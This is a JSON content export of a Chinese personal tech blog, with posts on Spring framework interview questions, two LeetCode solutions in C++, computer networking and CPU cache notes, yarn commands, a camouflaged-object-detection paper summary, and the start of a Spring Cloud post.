{"meta":{"title":"DFSgwb","subtitle":"My World","description":"我的技术分享","author":"GWB","url":"https://dfsgwb.github.io","root":"/"},"pages":[{"title":"about","date":"2023-04-12T09:04:43.000Z","updated":"2023-04-12T12:36:38.502Z","comments":true,"path":"about/index.html","permalink":"https://dfsgwb.github.io/about/index.html","excerpt":"","text":"Hi there 👋😐 作者 Tell me, does the god Argvchs bleed?No, but you will. ✒️ 内容 ⚡ 算法 📖 教程 🔧 工具 💬 其他 💡 语言 🦄 C&#x2F;C++ 🐍 Python 🐤 JS &#x2F; Node.js 🐳 Bash 🐱 Vue 2 &#x2F; Vue 3 🐶 React 🐘 Electron ✨ 帐号 Website Account QQ Argvchs: 2973024690 Github Argvchs: DFSgwb CSDN Argvchs: 不会算法的数学小白 Leetcode Argvchs: 暴力解决一切"},{"title":"分类","date":"2023-04-12T09:00:21.000Z","updated":"2023-04-12T09:34:36.401Z","comments":true,"path":"categories/index.html","permalink":"https://dfsgwb.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2016-04-28T09:32:38.000Z","updated":"2023-04-12T08:56:58.891Z","comments":true,"path":"tags/index.html","permalink":"https://dfsgwb.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Spring面试基础题","slug":"Spring面试基础题","date":"2023-07-12T02:47:51.000Z","updated":"2023-07-12T03:02:57.495Z","comments":true,"path":"2023/07/12/Spring面试基础题/","link":"","permalink":"https://dfsgwb.github.io/2023/07/12/Spring%E9%9D%A2%E8%AF%95%E5%9F%BA%E7%A1%80%E9%A2%98/","excerpt":"","text":"什么是 Spring 框架？Spring 是一个轻量级的控制反转（IoC）和面向切面（AOP）的容器框架。目的是为了解决企业级应用开发的业务逻辑层和其他各层的耦合问题。是一个分层的 JavaSE&#x2F;EE full-stack（一站式）轻量级开源框架。为 Java 应用程序提供了全面的基础性服务支持，通过 IOC 和 AOP 功能，Spring 帮助企业级应用程序在简单的 Java 对象（POJO）上构建简洁、可维护的企业级应用。 为了降低 Java 开发的复杂性，Spring 采用了以下 4 种关键策略： 基于 POJO 的轻量级和最小侵入性编程； 通过 IOC、依赖注入（DI）和面向接口实现松耦合； 基于切面和惯例进行声明式编程； 通过切面和模板减少样式代码； Spring 的两大核心概念控制反转（IoC）控制反转是一种通过描述（XML 或注解）并通过第三方去生产或获取特定对象的方式。在 Spring 中实现控制反转的是 IOC 容器，其实现方法是依赖注入（Dependency Injection，DI）。IOC 容器在创建对象时，会将它所依赖的对象注入进去，而不是由对象主动去获取依赖对象。核心思想是将程序的控制权从程序员转移到了 Spring 容器，通过容器来实现对象的装配和管理。程序员只需要关注业务逻辑本身的实现，而不用去管理对象的创建和组装。 优点： 降低了组件之间的耦合度，提高了代码的可重用性和可维护性； 提高了系统的扩展性和灵活性，通过配置文件或注解的方式来描述对象的依赖关系，可以方便的进行配置和修改，不需要修改代码； 提高了代码的可维护性和可测试性，因为控制反转后，每个组件的职责更加单一，代码更加容易测试，同时也便于功能复用。 降低开发成本，降低了代码的复杂度，提高了开发效率。 面向切面编程（AOP）面向切面编程是一种新的编程范式，是对传统 OOP 的补充。OOP 通过封装、继承、多态来建立一种对象层次结构，以此来模拟真实世界。而 AOP 则是针对业务处理过程中的切面进行提取，它所面对的是处理过程中的某个步骤或阶段，这些步骤或阶段通常称为横切关注点，这些横切关注点在业务处理过程中往往散布于各个业务模块中，而核心业务模块往往会有多个对象参与，这些横切关注点在对象中得到分散和实现，它们分散于各个不同的对象中，与业务无关，却为业务所共同调用。AOP 的作用在于分离系统中的各种关注点，将核心关注点和横切关注点分离开来，横切关注点被封装为特殊的类，称为切面（Aspect），切面将导致系统的多个模块都产生影响，所以 AOP 被称为横切面向的编程。 Spring AOP 支持以下几种类型的切面 基于方法的切面：通过在方法执行之前，之后或者抛出异常时执行额外的逻辑来切入方法 基于切点的切面：通过定义一个切点，该切点确定在哪些方法上应用切面逻辑 基于注解的切面：通过在切面逻辑上添加注解，Spring 将判断何时应该在运行时应用该切面逻辑 Spring AOP 通知（Advice）的类型 前置通知（Before）：在目标方法被调用之前调用通知功能 后置通知（After）：在目标方法完成之后调用通知，此时不会关心方法的输出是什么 异常通知（AfterThrowing）：在目标方法抛出异常后调用通知 最终通知（AfterReturning）：在目标方法完成之后调用通知，此时不会关系方法是否执行成功 环绕通知（Around）：在目标方法调用前后调用通知，可以控制目标方法的执行与否 Spring 的优点 方便解耦，简化开发：Spring 就是一个大工厂，可以将所有对象创建和依赖关系维护，交给 Spring 管理。 AOP 编程的支持：Spring 提供面向切面编程，可以方便的实现对程序进行权限拦截和运行监控等功能。 声明式事务的支持：只需要通过配置就可以完成对事务的管理，而无需手动编程。 方便程序的测试：Spring 对 Junit4 支持，可以通过注解方便的测试 Spring 程序。 方便集成各种优秀框架：Spring 不排斥各种优秀的开源框架，其内部提供了对各种优秀框架（如：Struts、Hibernate、MyBatis、Quartz 等）的直接支持。 降低 JavaEE API 的使用难度：Spring 对 JavaEE 开发中非常难用的一些 API（JDBC、JavaMail、远程调用等），都提供了封装，使这些 API 应用难度大大降低。 Spring 的缺点 Spring 的 API 比较难学，它是一个学习成本较高的框架。 依赖反射机制，会影响程序的性能。 没有轻量框架的感觉，配置过于复杂，比如需要配置文件、依赖等。 Spring 的架构 Spring 总共大约有 20 个模块， 由 1300 多个不同的文件构成。 而这些组件被分别整合在核心容器（Core Container） 、 AOP（Aspect Oriented Programming）和设备支持（Instrmentation） 、数据访问与集成（Data Access&#x2F;Integeration） 、 Web、 消息（Messaging） 、 Test 等 6 个模块中 核心容器（Core Container）：核心容器提供 Spring 框架的基本功能。核心容器的主要组件是 BeanFactory，它是工厂模式的实现。BeanFactory 使用控制反转（IOC） 模式将应用程序的配置和依赖性规范与实际的应用程序代码分开。编程人员可以通过配置文件来指定应用程序需要哪些对象，由 BeanFactory 来将这些对象实例化。 AOP（Aspect Oriented Programming）：通过配置管理特性，Spring AOP 模块直接将面向方面的编程功能集成到了 Spring 框架中。所以，可以很容易地使 Spring 框架管理的任何对象支持 AOP。Spring AOP 模块为基于 Spring 的应用程序中的对象提供了事务管理服务。通过使用 Spring AOP，不用依赖 EJB 组件，就可以将声明性事务管理集成到应用程序中。 Beans：Beans 模块是构成框架的基础。它提供了 BeanFactory，它是工厂模式的经典实现，以及用于处理控制反转的 BeanFactoryPostProcessor 和 BeanPostProcessor 接口。BeanFactoryPostProcessor 可以在容器实例化任何 bean 之前读取配置元数据，并可以根据需要进行修改。BeanPostProcessor 接口允许 bean 实例在实例化过程中进行自定义修改。Spring 将管理对象称为 bean。 Context：Context 模块构建于 Beans 模块之上。它添加了国际化（使用 ContextMessageSource 接口）、资源加载（使用 ContextResourceLoader 接口）和对框架事件的发布（使用 ApplicationEventPublisher 接口，ApplicationContext 接口实现了这个接口）的支持。ApplicationContext 是 Beans 模块的一个子集，它添加了自动化生命周期管理。这些功能包括容器的启动和关闭时自动化的实例化和销毁。它还检测由框架和应用程序抛出的任何 BeanException 类型的异常，并将它们重新抛出为更易于使用的异常类型。 jdbc：JDBC 模块提供了一个 JDBC 抽象层，它消除了编写冗长的 JDBC 代码和针对特定数据库供应商的代码的需要。Transaction 模块支持程序式和声明式事务管理，JDBC 模块提供了一个 JDBC 抽象层，它消除了编写冗长的 JDBC 代码和针对特定数据库供应商的代码的需要。Transaction 模块支持程序式和声明式事务管理。 Web：Web 模块提供了基本的 Web 集成特性，例如多文件上传功能、使用 Servlet 监听器初始化 IoC 容器、使用 Web 应用程序上下文自动注册 bean 等。 Test：Test 模块支持使用 JUnit 和 TestNG 进行测试。它还提供了 Spring 应用程序上下文的 Mock 实现，用于测试代码。 Spring 的设计模式 工厂模式：Spring 使用工厂模式通过 BeanFactory、ApplicationContext 创建 bean 对象。 单例模式：Spring 中的 Bean 默认都是单例的。 代理模式：Spring AOP 功能的实现。用到了 JDK 动态代理和 CGLIB 字节码生成技术。 模板方法模式：Spring 中 jdbcTemplate、hibernateTemplate 等以 Template 结尾的对数据库操作的类，它们就使用到了模板模式。用来解决代码重复的问题，它定义了一个算法的步骤，并允许子类为一个或多个步骤提供实现。 观察者模式：定义对象键一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都得到通知并被自动更新。如 Spring 中 Listener 的实现 ApplicationListener。 JDK 动态代理JDK 动态代理是 Java 语言自带的动态代理，它位于 java.lang.reflect 包中的 Proxy 类和 InvocationHandler 接口，一般情况下，动态代理的使用不需要用户去直接操作它的 API，而是通过一些间接的方式来间接使用动态代理的 API。使用动态代理的步骤： 创建一个实现接口 InvocationHandler 的类，该类负责实现代理逻辑，在实现类中，需要重写 invoke 方法，在代理对象的方法被调用时 invoke 会被执行。 通过 Proxy 的静态方法 newProxyInstance(ClassLoader loader,Class[] interfaces,InvocationHandler h)创建一个代理对象。三个参数的含义：classLoader 类加载器，class[]被代理的接口，InvocationHandler h 实现类的实例。 通过代理对象调用目标方法。实际上是调用了 InvocationHandler 的 invoke 方法。优点：不需要实现接口，可以在运行期动态的创建某个对象的代理对象。缺点：只能代理实现了接口的类，不能代理没有实现接口的类。 Java 字节码Java 字节码是一种中间代码，它是 Java 源代码编译后的结果。Java 字节码可以在任何支持 Java 虚拟机（JVM）的平台上运行，这使得 Java 成为一种跨平台的编程语言。Java 字节码是一种基于栈的指令集，它包含了一系列的指令，用于执行各种操作，例如加载、存储、运算、跳转等。Java 字节码可以通过反编译工具转换为 Java 源代码，这使得 Java 字节码成为一种保护 Java 代码的方式。在 Java 中，动态代理和 AOP 等技术都是基于 Java 字节码实现的。 CGLIB 字节码生成CGLIB（Code Generation Library）是一个基于 ASM（Java 字节码操控框架）的字节码生成库，它允许我们在运行时对字节码进行修改和动态生成。CGLIB 通过继承方式实现代理，它也是 Spring AOP 实现的方式之一。它可以通过继承和重写方法来生成代理类，并在代理类中添加额外的逻辑.CGLIB 通过生成目标类的子类来实现代理，然后在子类中重写目标方法，并在重写的方法中添加额外的逻辑，这种比原生的代理更加灵活，但是也有一些缺点，因为它是通过继承来实现代理的，所以如果目标类是 final 类型的，那么它是无法继承的，也就无法实现代理。下面是一个简单的 CGLIB 代理的例子： public class TargetClass &#123; public void doSomething() &#123; System.out.println(&quot;TargetClass: doSomething&quot;); &#125; &#125; public class MyInterceptor implements MethodInterceptor &#123; @Override public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable &#123; System.out.println(&quot;Before method: &quot; + method.getName()); Object result = proxy.invokeSuper(obj, args); System.out.println(&quot;After method: &quot; + method.getName()); return result; &#125; &#125; public class Main &#123; public static void main(String[] args) &#123; Enhancer enhancer = new Enhancer(); enhancer.setSuperclass(TargetClass.class); enhancer.setCallback(new MyInterceptor()); TargetClass proxy = (TargetClass) enhancer.create(); proxy.doSomething(); &#125; &#125; Spring Context 应用上下文模块这是基本的 Spring 模块，提供 Spring 框架的基础功能，BeanFactory 是任何以 spring 为基础的应用的核心，Spring 框架建立在此模块之上，它使 Spring 成为一个容器。Bean 工厂是工厂模式的实现，提供了控制反转 IOC 功能，用来把应用的配置和依赖从实际的应用代码中解耦出来。最常用的就是 org.springframework.beans.factory.xml.XmlBeanFactory，它从 XML 文件中读取配置元数据，由这些元数据来生成一个被配置化的系统或者应用。","categories":[{"name":"后端开发","slug":"后端开发","permalink":"https://dfsgwb.github.io/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"面试","slug":"面试","permalink":"https://dfsgwb.github.io/tags/%E9%9D%A2%E8%AF%95/"},{"name":"Java","slug":"Java","permalink":"https://dfsgwb.github.io/tags/Java/"},{"name":"后端","slug":"后端","permalink":"https://dfsgwb.github.io/tags/%E5%90%8E%E7%AB%AF/"},{"name":"Spring","slug":"Spring","permalink":"https://dfsgwb.github.io/tags/Spring/"}]},{"title":"leetcode 1911","slug":"leetcode1011","date":"2023-07-11T07:12:30.000Z","updated":"2023-07-11T12:45:42.604Z","comments":true,"path":"2023/07/11/leetcode1011/","link":"","permalink":"https://dfsgwb.github.io/2023/07/11/leetcode1011/","excerpt":"","text":"题目： 一个下标从 0 开始的数组的$交替和$定义为$偶数$下标处元素之和减去$奇数$下标处元素之和。比如，数组[4,2,5,3]的交替和为(4 + 5) - (2 + 3) &#x3D; 4 。 给你一个数组 nums ，请你返回 nums 中任意子序列的最大$交替和$（子序列的下标重新从 0 开始编号）。 一个数组的$子序列$是从原数组中删除一些元素（可能一个元素都不删除）后剩余元素不改变顺序得到的序列。比方说，[2,7,4] 是 [4,2,3,7,2,1,4] 的一个子序列（加粗元素），但是 [2,4,2] 不是 输入输出示例 1： 输入：nums &#x3D; [4,2,5,3]输出：7解释：最优子序列为 [4,2,5] ，交替和为 (4 + 5) - 2 &#x3D; 7 。 示例 2: 输入：nums &#x3D; [5,6,7,8]输出：8解释：最优子序列为 [8] ，交替和为 8 。 示例 3: 输入：nums &#x3D; [6,2,1,2,4,5]输出：10解释：最优子序列为 [6,1,5] ，交替和为 (6 + 5) - 1 &#x3D; 10 。 提示 $1 &lt;&#x3D; nums.length &lt;&#x3D; 10^5$1 &lt;&#x3D; nums[i] &lt;&#x3D; $10^5$ 题解：#include &lt;bits/stdc++.h&gt; using namespace std; class Solution &#123; public: long long maxAlternatingSum(vector&lt;int&gt; &amp;nums) &#123; long long res = 0; long long ans = nums[0]; for (int i = 0; i &lt; nums.size(); i++) &#123; ans = max(ans, res + nums[i]); res = max(res, ans - nums[i]); &#125; return ans; &#125; &#125;;","categories":[{"name":"每日一题","slug":"每日一题","permalink":"https://dfsgwb.github.io/categories/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://dfsgwb.github.io/tags/C/"},{"name":"ACM","slug":"ACM","permalink":"https://dfsgwb.github.io/tags/ACM/"},{"name":"刷题","slug":"刷题","permalink":"https://dfsgwb.github.io/tags/%E5%88%B7%E9%A2%98/"},{"name":"leetcode","slug":"leetcode","permalink":"https://dfsgwb.github.io/tags/leetcode/"}]},{"title":"leetcode 16","slug":"leetcode16","date":"2023-07-10T00:12:30.000Z","updated":"2023-07-10T11:50:43.572Z","comments":true,"path":"2023/07/10/leetcode16/","link":"","permalink":"https://dfsgwb.github.io/2023/07/10/leetcode16/","excerpt":"","text":"题目： 给定一个包括 n 个整数的数组 nums 和 一个目标值 target。找出 nums 中的三个整数，使得它们的和与 target 最接近。返回这三个数的和。假定每组输入只存在唯一答案。 输入输出示例 1： 输入：nums &#x3D; [-1,2,1,-4], target &#x3D; 1输出：2解释：与 target 最接近的和是 2 (-1 + 2 + 1 &#x3D; 2) 。 示例 2: 输入：nums &#x3D; [0,0,0], target &#x3D; 1输出：0 提示： 3 &lt;&#x3D; nums.length &lt;&#x3D; $10^3$ $-10^3$ &lt;&#x3D; nums[i] &lt;&#x3D; $10^3$ $-10^4$ &lt;&#x3D; target &lt;&#x3D; $10^4$ 题解：最先想三重暴力试一下 class Solution &#123; public: int threeSumClosest(vector&lt;int&gt;&amp; nums, int target) &#123; int res = 0, n = nums.size(), diff = INT_MAX; for (int i = 0; i &lt; n - 2; i++) &#123; for (int j = i + 1; j &lt; n - 1; j++) &#123; for (int k = j + 1; k &lt; n; k++) &#123; int sum = nums[i] + nums[j] + nums[k]; if (abs(sum - target) &lt; diff) &#123; diff = abs(sum - target); res = sum; &#125; &#125; &#125; &#125; return res; &#125; &#125;; 然后发现，确实是会被卡部分测试样例，看来 O($n^3$)的算法复杂度是不可行的，得想办法优化一下，于是想到了双指针法，先排序，然后固定一个数，另外两个数用双指针法，这样时间复杂度就是$O(n^2)$了 class Solution &#123; public: int threeSumClosest(vector&lt;int&gt;&amp; nums, int target) &#123; int res = 0, n = nums.size(), diff = INT_MAX; sort(nums.begin(), nums.end()); for(int i=0;i&lt;n-1;i++)&#123; int l = i+1, r = n-1; while(l&lt;r)&#123; int sum = nums[i] + nums[l] + nums[r]; if(abs(sum-target)&lt;diff)&#123; diff = abs(sum-target); res = sum; &#125; if(sum&lt;target) l++; if(sum&gt;target) r--; if(sum==target) return res; &#125; &#125; return res; &#125; &#125;;","categories":[{"name":"每日一题","slug":"每日一题","permalink":"https://dfsgwb.github.io/categories/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://dfsgwb.github.io/tags/C/"},{"name":"ACM","slug":"ACM","permalink":"https://dfsgwb.github.io/tags/ACM/"},{"name":"刷题","slug":"刷题","permalink":"https://dfsgwb.github.io/tags/%E5%88%B7%E9%A2%98/"},{"name":"leetcode","slug":"leetcode","permalink":"https://dfsgwb.github.io/tags/leetcode/"}]},{"title":"图解网络","slug":"图解网络","date":"2023-07-06T12:47:51.000Z","updated":"2023-07-11T13:27:16.491Z","comments":true,"path":"2023/07/06/图解网络/","link":"","permalink":"https://dfsgwb.github.io/2023/07/06/%E5%9B%BE%E8%A7%A3%E7%BD%91%E7%BB%9C/","excerpt":"","text":"TCP&#x2F;IP 网络模型 1.应用层：HTTP、FTP、SMTP、DNS,工作在操作系统中的用户态，传输层则工作在内核态 2.传输层：TCP、UDP，为应用层提供网络支持的 3.网络层：IP，为传输层提供网络支持的。 IP 地址分为两种意义：网络号和主机号，网络号用来标识网络，主机号用来标识主机。IP 地址分为 A、B、C、D、E 五类，其中 A、B、C 三类用于标识主机，D 类用于多播，E 类保留。 子网掩码计算网络地址和主机地址的方法：将 IP 地址和子网掩码转换成二进制，然后将 IP 地址和子网掩码按位与运算，得到的结果就是网络地址。 4.网络接口层：ARP、RARP、ICMP，为网络层提供网络支持的。 DNS 服务器的作用：专门报出来 Web 服务器域名和 ip 地址之间的映射关系，将域名转换成 IP 地址。 协议栈 TCP 报文格式 TCP 分割数据：当 HTTP 请求消息比较长，超过 MSS 的长度，这时 TCP 就要将 HTTP 请求消息分割成多个 TCP 报文段进行传输，这就是 TCP 分割数据。 MTU：链路层的最大传输单元，是链路层所能通过的最大帧的大小，单位是字节。MTU 的大小是固定的，一般为 1500 字节。由 IP 头部和 TCP 头部组成的报文段的长度称为 MSS（Maximum Segment Size，最大分段大小），MSS 的大小是可变的，一般为 1460 字节。TCP 报文段的首部长度是 20 字节，如果 TCP 报文段的 MSS 为 1460 字节，那么 TCP 报文段的长度就是 1480 字节，如果 TCP 报文段的 MSS 为 1000 字节，那么 TCP 报文段的长度就是 1020 字节。 IP 头部 IP 数据包：IP 头部+TCP 头部+HTTP 头部+HTTP 数据 最后实现两边输出还要再封装一层 MAC 头部，MAC 头部是以太网使用的头部，包含接收方和发送方的 MAC 地址，以太网的数据帧格式如下： 使用 ARP 协议实现两点之间的 MAC 地址映射，ARP 协议的工作原理如下： 网络包只是存放在内存中的一串二进制数字信息，没有办法直接发送给对方。因此，我们需要将数字信息转换为电信号，才能在网线上传输，也就是说，这才是真正的数据发送过程。这一过程的实现是由网卡实现的，网卡是计算机的一块硬件，它的作用是将数字信息转换为电信号，然后通过网线发送出去。负责执行这一操作的是网卡，要控制网卡还需要靠网卡驱动程序。 网卡驱动获取网络包之后，会将其复制到网卡内的缓存区中，接着会在其开头加上报头和起始帧分界符，在末尾加上用于检测错误的帧校验序列。","categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"https://dfsgwb.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"后端","slug":"后端","permalink":"https://dfsgwb.github.io/tags/%E5%90%8E%E7%AB%AF/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://dfsgwb.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"Feature Shrinkage Pyramid for Camouflaged Object Detection with Transformers","slug":"Feature Shrinkage Pyramid for COD with Transformers","date":"2023-06-30T00:30:16.000Z","updated":"2023-07-03T02:20:53.518Z","comments":true,"path":"2023/06/30/Feature Shrinkage Pyramid for COD with Transformers/","link":"","permalink":"https://dfsgwb.github.io/2023/06/30/Feature%20Shrinkage%20Pyramid%20for%20COD%20with%20Transformers/","excerpt":"","text":"虽然较大的卷积核或者使用较小的卷积块叠加可以增加感受野，但是这种方法会导致参数量的增加，而且对于大尺度的感受野，这种方法的效果并不好。因此，本文提出了一种新的方法，即特征收缩金字塔（FSP），它可以有效地增加感受野，同时保持较少的参数量。 当前使用VIT处理COD任务的方法存在两个主要的技术问题 1.VIT的局部建模效果不佳，本文认为其原因是全局特征和局部特征在COD中都具有较为重要的作用，但是目前的VIT方法缺乏在局部区域内进行行信息交互的机制。2.解码器特征聚合的局限性，现有的解码器通常是直接聚合具有显著信息差异的特征，其倾向抛弃一些不明显但具有价值的线索或引入噪声。导致不准确的预测结果。 为此本文提出一种新颖的基于VIT的特征收缩金字塔网络旨在通过渐进收缩对伪装目标的局部增强全局表示的相邻VIT特征进行分层解码，从而在编码器和解码器中挖掘和积累丰富的伪装目标局部线索和全局上下文，实现伪装目标的精确检测。 Related WorkCNN-based COD1.通过精心设计的特征搜索模块从背景中挖掘伪装对象的不显眼特征。 上下文特征学习纹理感知学习频域学习 2.在数据标记为COD伪装数据本身时对不确定性进行建模3.多任务学习框架，引入辅助任务，提高伪装目标检测的性能，如边缘&#x2F;边界检测，分类，对象排序等。4.通过模仿捕食者的行为模式或视觉机制来检测伪装物体。如搜索和识别过程，以及放大和缩小的视觉机制。5.利用运动信息在视频中发现伪装目标。 Decoding StrategySOD，MIS，COD等视觉任务的解码器设计可以归纳为四种类型：(1)U型解码结构,(2)密集集成策略(3)反馈细化策略(4)低层和高层特征的分离解码策略。 作为主流的解码器结构，U型解码器集成横向输出多尺度主干特征，并以自下而上的方法逐步恢复对象细节，为了削弱大分辨率差异对特征融合兼容性的干扰，可以使用密集集成策略来聚合多级特征，一些方法分别处理高级输出特征，然后将它们与其他横向输出相结合。 Proposed Method总体架构如下图所示 由VIT编码器，局部令牌增强模块和特征收缩解码器三部分组成。具体来说就是先将输入图片序列化为令牌后，作为VIT编码器的输入，使用自注意力机制对全局上下文进行建模，使用局部令牌来执行令牌之间和令牌内的特征交互和探索。从而增强模块来增强局部特征，最后使用特征收缩解码器来对特征进行解码，得到最终的预测结果。 Transformer具有强大的全局视野，但是缺乏在局部区域内进行信息交互的机制，伪装目标总是和噪声对象和背景共享相似的外观信息，其中的微小差异很难通过低阶关系来区分，因此，本文提出了一种局部令牌增强模块来增强局部特征，从而增强局部特征的建模能力，同时保持全局特征的建模能力。首先采用非局部操作来交互相似的令牌，以聚合相邻的伪装线索，然后采用GCN运算来探索令牌内不同像素之间的高阶语义关系，以发现细微的判别特征。","categories":[{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/categories/SOD/"}],"tags":[{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/tags/SOD/"},{"name":"COD","slug":"COD","permalink":"https://dfsgwb.github.io/tags/COD/"},{"name":"Transformer","slug":"Transformer","permalink":"https://dfsgwb.github.io/tags/Transformer/"}]},{"title":"图解系统","slug":"图解系统","date":"2023-06-27T12:47:51.000Z","updated":"2023-07-08T14:10:26.242Z","comments":true,"path":"2023/06/27/图解系统/","link":"","permalink":"https://dfsgwb.github.io/2023/06/27/%E5%9B%BE%E8%A7%A3%E7%B3%BB%E7%BB%9F/","excerpt":"","text":"冯诺依曼模型计算机基本的五个结构：运算器，控制器，存储器，输入设备，输出设备。内存：程序和数据的存储位置，存储的基本单位是字节 中央处理器(CPU)：负责程序的运行和控制，是计算机的核心部件，由运算器和控制器组成,运算器负责算术运算和逻辑运算，控制器负责控制程序的执行。控制单元复杂控制 CPU 工作，逻辑运算单元负责计算，寄存器根据种类的不同所对应的功能也不尽相同。 通用寄存器：用来存放需要进行运算的数据程序计数器：用来存放下一条指令的地址。注意所存放的不是下一条指令，此时指令还在内存中，而是下一条指令的地址。指令寄存器：用来存放当前正在执行的指令 总线：用于 CPU 和其他部件之间的信息传递，分为数据总线，地址总线，控制总线。使用顺序一般是首先要通过「地址总线」来指定内存的地址，然后通过「控制总线」控制是读或写命令，最后通过「数据总线」来传输数据； 数据总线：用于读写内存的数据地址总线：用于指定 CPU 将要操作的内存地址控制总线：用于发送和接受信号，比如中断，设备复位等信号，CPU 收到信号后自然进行相应，这时也需要控制总线。 输入设备：负责将外部信息转换成计算机可识别的信息输出设备：负责将计算机处理的信息转换成人们可识别的信息 CPU Cache 的数据结构和读取过程是什么样的？ CPU Cache 是由多个 Cache Line 组成的，Cache Line 是 CPU 从内存读取数据的基本单位，而 Cache Line 是由各种标志(Tag)+数据块(Data Block)组成的，Tag 用于标识该 Cache Line 所对应的内存地址，Data Block 则是真正存放数据的地方。当 CPU 需要从内存中读取数据时，首先会根据地址找到对应的 Cache Line，然后再根据 Tag 判断该 Cache Line 中是否存放了需要的数据，如果存放了，就直接从 Data Block 中读取数据，如果没有存放，就需要从内存中读取数据，然后将数据存放到 Data Block 中，同时更新 Tag。 CPU 访问内存数据是一小块一小块数据读取的，这个块的大小取决于 coherency_line_size 的值大小，一般是 64 字节，在内存中这一块数据被称为内存块，读取的时候我们要拿到数据所在的内存块地址。对于直接映射 Cache 采用的策略，就是把内存块的地址始终「映射」在一个 CPU Cache Line（缓存块）的地址，至于映射关系实现方式，则是使用「取模运算」，取模运算的结果就是内存块地址对应的 CPU Cache Line（缓存块）的地址。 由于同一个 Cache Line 中会有多个内存块，所以为了区别不同的内存块，还会存储一个组标记（Index），组标记的作用就是用来标识当前 Cache Line 中的内存块是哪个组的，这样就可以通过组标记来判断当前 Cache Line 中的内存块是否是我们需要的内存块，如果是，就直接从 Cache Line 中读取数据，如果不是，就需要从内存中读取数据，然后将数据存放到 Cache Line 中，同时更新组标记。 内存地址的构成：组标记+CPU Cache Line 索引+内存块内偏移量 CPU Cache 的数据写入 如何将数据写入到内存中呢？这就需要用到写策略了，写策略有两种，一种是写回策略，一种是写直达策略。 写直达方式：保持内存与 cache 一致性最简单的方式是把数据同时写入内存和 Cache 中，这种方法就是写直达。 写回方式：写回方式则是只将数据写入到 Cache 中，当 Cache 中的数据被替换时，再将数据写入到内存中。当发生写操作时，新的数据仅仅被写入 Cache Block 里，只有当修改过的 Cache Block「被替换」时才需要写到内存中，减少了数据写回内存的频率，这样便可以提高系统的性能 yarn 常用命令yarn init 初始化项目yarn add 添加依赖yarn remove 删除依赖yarn upgrade 升级依赖yarn install 安装依赖yarn run 运行脚本yarn cache clean 清除缓存yarn config get 获取配置yarn config set 设置配置yarn config delete 删除配置yarn config list 列出配置安装包：yarn install &#x2F;&#x2F;安装 package.json 里所有包，并将包及它的所有依赖项保存进 yarn.lockyarn install –flat &#x2F;&#x2F;安装一个包的单一版本yarn install –force &#x2F;&#x2F;强制重新下载所有包yarn install –production &#x2F;&#x2F;只安装 dependencies 里的包yarn install –no-lockfile &#x2F;&#x2F;不读取或生成 yarn.lockyarn install –pure-lockfile &#x2F;&#x2F;不生成 yarn.lock yarn add –exact&#x2F;-E &#x2F;&#x2F; 安装包的精确版本。例如 yarn add &#x66;&#111;&#x6f;&#x40;&#49;&#46;&#x32;&#x2e;&#x33;会接受 1.9.1 版，但是 yarn add &#x66;&#111;&#111;&#64;&#49;&#x2e;&#x32;&#46;&#x33; –exact 只会接受 1.2.3 版yarn add –tilde&#x2F;-T &#x2F;&#x2F; 安装包的次要版本里的最新版。例如 yarn add &#102;&#111;&#111;&#x40;&#x31;&#46;&#50;&#46;&#51; –tilde 会接受 1.2.9，但不接受 1.3.0 发布包：yarn pulish 移除一个包：yarn remove #移除一个包，会自动更新 package.json 和 yarn.lock 更新一个依赖yarn upgrade 用于更新包到基于规范范围的最新版本运行脚本yarn run #用来执行在 package.json 中 scripts 属性下定义的脚本显示某个包的信息yarn info #可以用来查看某个模块的最新版本信息 缓存：yarn cacheyarn cache list #列出已缓存的每个包 前端：Vue3+yarn+webpack+axios+vue-router+vuex+echarts+less+ES6+ESLint+Prettier+git+vscode 后端：golang+gin+gorm+mysql+redis+docker+swagger+goland+postman+goland+vscode","categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"https://dfsgwb.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"后端","slug":"后端","permalink":"https://dfsgwb.github.io/tags/%E5%90%8E%E7%AB%AF/"},{"name":"计算机系统","slug":"计算机系统","permalink":"https://dfsgwb.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"}]},{"title":"Spring cloud","slug":"Spring_cloud","date":"2023-06-07T08:47:51.000Z","updated":"2023-06-09T02:28:41.974Z","comments":true,"path":"2023/06/07/Spring_cloud/","link":"","permalink":"https://dfsgwb.github.io/2023/06/07/Spring_cloud/","excerpt":"","text":"Spring Cloud架构 Spring Cloud特性Spring Cloud Context：ApplicationContext 1.Bootstrap:对于主程序来说是一个父级上下文，它支持从外部资源中加载配置文件，和解密本地外部配置文件中的属性，Bootstrap上下午和应用上下文将共享一个环境，这是所有Spring应用程序的外部属性，一般来说，Bootstrap上下文中的属性优先级比较高，所有不能被本地配置所覆盖。Spring的上下文有一个特性，子级上下文将从父级中继承属性源和配置文件，如果通过SpringApplication或者SpringApplicationBuilder来构建应用程序上下文，那么Bootstrap上下文将会成为该应用程序上下文的父级上下文","categories":[{"name":"后端开发","slug":"后端开发","permalink":"https://dfsgwb.github.io/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://dfsgwb.github.io/tags/Java/"},{"name":"后端","slug":"后端","permalink":"https://dfsgwb.github.io/tags/%E5%90%8E%E7%AB%AF/"},{"name":"Spring 